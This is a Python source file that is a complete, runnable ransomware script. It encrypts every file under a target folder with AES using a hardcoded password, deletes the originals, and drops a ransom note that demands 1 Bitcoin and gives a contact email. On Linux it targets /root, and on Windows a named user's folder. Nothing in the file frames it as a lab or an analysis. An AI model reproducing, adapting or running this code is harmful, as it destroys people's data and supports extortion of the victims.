import os
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import platform

# predefined password
PASSWORD = "Your Password"

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = Scrypt(
        salt=salt,
        length=32,
        n=2**14,
        r=8,
        p=1,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    return key

def encrypt_data(data: bytes, password: str) -> bytes:
    salt = os.urandom(16)
    key = derive_key(password, salt)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return salt + iv + encrypted_data

def encrypt_file(file_path: str, password: str) -> None:
    with open(file_path, "rb") as f:
        file_data = f.read()
    encrypted_data = encrypt_data(file_data, password)
    new_file_path = file_path + ".enc"
    with open(new_file_path, "wb") as f:
        f.write(encrypted_data)
    os.remove(file_path)
    print(f"Encrypted and deleted {file_path} -> {new_file_path}")

def encrypt_folder(folder_path: str, password: str) -> None:
    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, password)
    create_ransom_note_webpage(folder_path)

def create_ransom_note_webpage(folder_path: str):
    ransom_note_html = """
    <html>
    <head>
        <title>You're Hacked!</title>
    </head>
    <body>
        <h1>Your files have been encrypted!</h1>
        <p>To decrypt your files, send 1 Bitcoin to the following address:</p>
        <p><strong>Crypto Wallet ID</strong></p>
        <p>After payment, send the transaction ID to this email: ssh_nik@proton.me</p>
    </body>
    </html>
    """
    with open(os.path.join(folder_path, "RANSOM_NOTE.html"), "w") as f:
        f.write(ransom_note_html)

def main():
#    ascii_art = """
# _   _ _   _    
#| \ | (_) | |   
#|  \| |_  | | __
#| . ` | | | |/ /
#| |\  | | |   < 
#|_| \_|_| |_|\_\ 
#"""
#    print(ascii_art)

    # Detect operating system
    os_type = platform.system()
    if os_type == "Windows":
            target = r"C:\Users\Nikhil Kulkarni\Desktop\Nik"
    elif os_type == "Linux":
        target = "/root"
    else:
        print("Unsupported OS.")
        return

    # Automatically encrypt based on detected OS
    if os.path.isdir(target):
        encrypt_folder(target, PASSWORD)
        print(f"Encrypted all files in {target}")
        create_ransom_note_webpage(target)
    else:
        print(f"Invalid target directory: {target}")

if __name__ == "__main__":
    main()



